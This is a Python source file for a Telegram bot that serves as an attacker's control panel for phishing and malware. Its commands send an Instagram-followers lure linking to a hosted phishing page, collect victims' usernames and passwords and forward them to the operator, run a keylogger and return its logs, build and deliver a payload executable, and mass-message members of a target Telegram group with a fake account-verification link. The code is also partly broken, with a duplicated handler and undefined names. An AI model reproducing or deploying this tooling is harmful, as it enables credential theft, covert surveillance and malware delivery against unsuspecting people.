import os
import threading
import time
import base64
import subprocess
from cryptography.fernet import Fernet
import requests
from PIL import Image
import pyxhook
import telebot
from telethon import TelegramClient
from flask import Flask, request
import asyncio
import logging
from telebot.async_telebot import AsyncTeleBot
import aiohttp
import gunicorn
from config import BOT_TOKEN, YOUR_CHAT_ID, AUTHORIZED_USERS
from keylogger import start_keylogger, stop_keylogger
from payload import generate_payload

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=["start", "help"])
def send_help(message):
    help_text = (
        "📖 *Available Commands:*\n\n"
        "/start or /hello - Welcome message.\n"
        "/phish - Sends a phishing link.\n"
        "/credentials - Collects credentials.\n"
        "/payload - Generates a secure payload file.\n"
        "/startkeylogger - Starts the keylogger.\n"
        "/stopkeylogger - Stops the keylogger.\n"
        "/keylogs - Fetches keylogs.\n"
        "/decryptlogs - Decrypts logs.\n"
        "/help - Displays this help message."
    )
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=["startkeylogger"])
def start_keylogger_handler(message):
    if message.chat.id in AUTHORIZED_USERS:
        threading.Thread(target=start_keylogger, daemon=True).start()
        bot.reply_to(message, "Keylogger started!")
    else:
        bot.reply_to(message, "⚠️ Unauthorized access.")

@bot.message_handler(commands=["stopkeylogger"])
def stop_keylogger_handler(message):
    if message.chat.id in AUTHORIZED_USERS:
        stop_keylogger()
        bot.reply_to(message, "Keylogger stopped.")
    else:
        bot.reply_to(message, "⚠️ Unauthorized access.")

@bot.message_handler(commands=["payload"])
def send_payload(message):
    if message.chat.id == YOUR_CHAT_ID:
        success, result = generate_payload()
        if success:
            with open(result, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, f"❌ {result}")
    else:
        bot.reply_to(message, "⚠️ Unauthorized access.")


# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)


# 3. Send Phishing Link
@bot.message_handler(commands=['phish'])
def send_fake_login_page(message):
    fake_link = "https://instag-pwk3.onrender.com"  # Your hosted phishing page
    bot.reply_to(message, f"1K - 100K $FREE$ and Limited, Get more Instagram Followers today:\n{fake_link}")

# 4. Collect Credentials
@bot.message_handler(commands=['credentials'])
def show_logged_credentials(message):
    """Respond with the logged credentials."""
    try:
        with open("credentials.txt", "r") as file:
            credentials = file.read()
        if credentials:
            bot.reply_to(message, f"📄 Logged Credentials:\n\n{credentials}")
        else:
            bot.reply_to(message, "⚠️ No credentials logged yet.")
    except FileNotFoundError:
        bot.reply_to(message, "⚠️ Credentials file not found.")

def collect_password(message):
    username = message.text
    bot.reply_to(message, "🔑 Now enter your password:")
    bot.register_next_step_handler(message, forward_credentials, username)

def forward_credentials(message, username):
    password = message.text
    bot.send_message(message.chat.id, "Thank you for verifying your credentials! ✅")
    # Send the credentials to your designated chat
    bot.send_message(YOUR_CHAT_ID, f"Phished Credentials:\nUsername: {username}\nPassword: {password}")

@bot.message_handler(commands=['payload'])
def send_payload(message):
    authorized_users = [YOUR_CHAT_ID]  # Replace with your chat ID(s)
    if message.chat.id in authorized_users:
        # Define paths
        script_path = "payload.py"  # Path to your script
        payload_path = "payload.exe"   # Path where the script saves the payload

        # Run the script to generate the payload
        try:
            bot.reply_to(message, "🔄 Generating the payload, please wait...")
            result = subprocess.run(['python', script_path], check=True, text=True, capture_output=True)
            bot.reply_to(message, f"✅ Payload generated successfully:\n{result.stdout}")
        except subprocess.CalledProcessError as e:
            bot.reply_to(message, f"❌ Error generating payload:\n{e.stderr}")
            return

        # Check if the payload file exists and send it
        if os.path.exists(payload_path):
            bot.reply_to(message, "🚀 Delivering the payload...")
            with open(payload_path, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, "⚠️ Payload file not found. Please check the script or path.")
    else:
        bot.reply_to(message, "⚠️ You are not authorized to request this file.")

# 4. Mass Messaging with Telethon
@bot.message_handler(commands=['target'])
def set_target(message):
    bot.reply_to(message, "📌 Please enter the name of the target group or username:")
    bot.register_next_step_handler(message, mass_phishing_start)

def mass_phishing_start(message):
    target_name = message.text.strip()
    bot.reply_to(message, f"🔍 Starting phishing for: {target_name}. Please wait...")

    # Create and set an event loop for this thread
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    try:
        # Run the async function in the created loop
        loop.run_until_complete(mass_phishing(target_name))
        bot.reply_to(message, f"✅ Phishing messages sent to: {target_name}.")
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {e}")
    finally:
        # Close the loop to clean up
        loop.close()

async def mass_phishing(target_name):
    async with client:
        try:
            # Fetch participants for a group or a single user
            participants = await client.get_participants(target_name)
            for user in participants:
                try:
                    await client.send_message(user, "🚨 Important: Verify your account:\nhttps://instag-pwk3.onrender.com")
                except Exception as e:
                    print(f"Failed to message user {user.id}: {e}")
        except Exception as e:
            print(f"Error fetching target participants: {e}")
# 7. Log Responses
@bot.message_handler(func=lambda msg: True)
def log_responses(message):
    try:
        with open("responses.log", "a") as log_file:
            log_file.write(f"User {message.chat.id} said: {message.text}\n")
        bot.reply_to(message, "✅ Your response has been logged.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error logging response: {e}")


@bot.message_handler(commands=["keylogs"])
async def fetch_keylogs_handler(message):
    if message.chat.id not in AUTHORIZED_USERS:
        await bot.reply_to(message, "⚠️ You are not authorized to use this command.")
        return

    try:
        with open(LOG_FILE, "r") as logfile:
            logs = logfile.read()
        if logs:
            await bot.reply_to(message, f"📄 Keylogs:\n{logs}")
        else:
            await bot.reply_to(message, "No keylogs found.")
    except FileNotFoundError:
        await bot.reply_to(message, "No keylogs found.")
    except Exception as e:
        logging.error(f"Error fetching keylogs: {e}")
        await bot.reply_to(message, "An error occurred while fetching keylogs.")

